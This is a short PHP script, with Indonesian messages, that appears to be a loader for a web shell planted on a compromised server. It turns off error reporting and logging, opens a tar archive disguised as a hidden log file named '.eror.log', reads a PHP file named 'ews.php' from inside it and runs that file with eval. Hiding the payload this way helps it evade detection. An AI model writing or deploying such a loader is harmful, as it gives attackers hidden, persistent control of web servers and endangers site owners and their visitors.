<?php
@session_start();
@set_time_limit(0);
@clearstatcache();
error_reporting(0);
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('display_errors', 0);

if (!class_exists('PharData')) {
    die("❌ Ekstensi Phar tidak aktif di server ini");
}

$tarFile = '.eror.log';
$fileInside = 'ews.php'; 

try {
    $phar = new PharData($tarFile);

    $content = @file_get_contents("phar://{$tarFile}/{$fileInside}");

    if ($content !== false && !empty($content)) {
        eval('?>' . $content);
    } else {
        echo "❌ Gagal membaca atau menemukan file '{$fileInside}' di dalam {$tarFile}.";
    }
} catch (Exception $e) {
    echo "❌ Terjadi kesalahan: " . $e->getMessage();
}
?>
